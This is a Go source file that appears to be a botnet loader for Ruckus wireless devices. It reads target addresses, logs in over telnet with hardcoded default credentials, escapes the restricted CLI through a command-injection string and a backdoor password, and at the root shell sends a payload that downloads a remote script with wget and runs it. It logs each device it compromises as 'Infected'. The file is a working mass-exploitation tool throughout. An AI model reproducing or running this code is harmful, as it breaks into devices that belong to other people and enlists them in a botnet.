package main

import (
	"bufio"
	"errors"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (	
	//all of our ports properly
	//this will ensure its done without errors
	Ports []int = []int{
		2323, 23, 24, //main port
	}

	//stores our payload properly
	Payload string = "rm -rf z.sh; cd tmp; wget http://ip/z.zh; chmod 777 z.sh;sh z.sh ruckus"
	EndingF string = "skid" //what your payload says once complete

	//stores all infected clients properly
	//this will ensure its done without errors
	infected int = 0

	//ignore this function properly
	//this will ensure we only finish when done
	wg sync.WaitGroup

	mux sync.Mutex
)

func main() {

	//reads from the file given
	//this will ensure its done properly
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		go func() { //sleeps goroutine
			executer := time.Now()
			//runs the executer properly
			//this will ensure its done properly
			if ip,err := RemoteExecute(scanner.Text()); err == nil { //renders the success message properly
				infected++ //adds an additional properly and safely onto the count properly
				log.Printf("[RUCKUS] Infected (%s) (%s) [%d]", ip, strconv.FormatFloat(time.Since(executer).Seconds(), 'f', 2, 64), infected)
			}
		}()
	}
	time.Sleep(10 * time.Second)
	wg.Wait() //waits for all to finish
}

//dials the host and runs our execution command
//this will ensure its done without errors happening
func RemoteExecute(target string) (string, error) { //err handles

	//checks len for valid target
	if len(target) <= 0 { //checks the length properly
		return "", errors.New("invalid target has been passed")
	}

	var Conn net.Conn = nil; wg.Add(1)
	defer wg.Done() //removes one from group
	//ranges through all of our possible ports
	//this will ensure we have a connection on one
	for _, Port := range Ports { //ranges through properly

		//dials the connection properly and safely
		//this will ensure its done properly and safely
		Connection, err := net.Dial("tcp", target+":"+strconv.Itoa(Port))
		if err != nil { //err handles properly and safely
			continue
		}

		//checks for the located connection
		//this will ensure we handle from there
		if Connection != nil { //checks for the connection
			Conn = Connection //saves into our memory for conn
		}
	}

	//this will ensure we dont ignore the conn
	//allows more safer connection without errors
	if Conn == nil { //err handles properly and safely
		return "", errors.New("couldn't dial the given target")
	}


	defer Conn.Close() //Close when function complete

	//tries to wait for the text properly
	//this will ensure we only run the next steps once complete
	if err := AwaitText(Conn, "Please login"); err != nil {
		return "", err //returns the error properly
	}


	//writes our login information properly
	//writes our main USERNAME into the remote host
	if _, err := Conn.Write([]byte("super\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//tries to wait for the text properly
	//this will ensure we only run the next steps once complete
	if err := AwaitText(Conn, "password"); err != nil {
		return "", err //returns the error properly
	}

	//writes our main PASSWORD into the remote host
	//this will ensure its done without errors happening
	if _, err := Conn.Write([]byte("sp-admin\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//checks if we have logged in properly
	//this will ensure its done without errors happening
	if err := AwaitText(Conn, "rkscli"); err != nil {
		return "", err //returns the error properly
	}

	//prints the success message properly and safely
	//this shall ensure its done without errors on purpose
	log.Printf("[RUCKUS] possible ruckus device located at %s\r\n", Conn.RemoteAddr().String())

	//resets the shell properly and safely
	//this will ensure its done without errors happening
	if _, err := Conn.Write([]byte("Ruckus\r\n")); err != nil {
		return "", err //returns the error properly
	}

	time.Sleep(1 * time.Second)

	//writes to our bin properly and safely
	//this will ensure its done without errors happening
	if _, err := Conn.Write([]byte("\";/bin/sh;\"\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//checks if we have logged in properly
	//this will ensure its done without errors happening
	if err := AwaitText(Conn, "rkscli"); err != nil {
		return "", err //returns the error properly
	}

	//writes the last authentication prompt
	//this will ensure open our buzybox prompt
	if _, err := Conn.Write([]byte("!v54!\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//awaits the text properly and safely
	//this will ensure we dont go futher without this
	if err := AwaitText(Conn, "What's your chow"); err != nil {
		return "", err //returns the error properly
	}

	//another clear enter properly
	//this will ensure its done without errors properly
	if _, err := Conn.Write([]byte("\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//checks for the buzybox to opened properly
	//this will ensure its done without errors happening
	if err := AwaitText(Conn, "#"); err != nil {
		return "", err //returns the error properly
	}

	//runs our commands inside busybox
	//this will now ensure its done without errors
	if _, err := Conn.Write([]byte(Payload+"\r\n")); err != nil {
		return "", err //returns the error properly
	}

	//awaits properly and safely without issues happening
	if len(EndingF) > 0 { //checks for it to complete properly
		//awaits the ending command properly and safely
		//this will ensure its done without errors happeningt
		if err := AwaitText(Conn, EndingF); err != nil {
			return "", err //returns the error properly
		}
	} else { //sleeps for runtime of 10 secs
		time.Sleep(10 * time.Second) //sleeps properly
	}

	return Conn.RemoteAddr().String(), nil //returns nil
}

//awaits for the prompt given inside the string
//this will ensure we only complete once done properly
func AwaitText(c net.Conn, prompt string) error {
	//3 second read deadline properly
	//awaits 3 seconds before killing from device
	c.SetReadDeadline(time.Now().Add(15 * time.Second)) 
	for { //for loops input reading
		buf := make([]byte, 1024) //live buffer
		if _, err := c.Read(buf); err != nil {
			return err //returns the error
		}

		//detects if it contains properly
		//this will check if we have found the output
		if strings.Contains(strings.ReplaceAll(string(buf), "\x00", ""), prompt) {
			return nil //returns a nil pointer properly
		}
	}
}
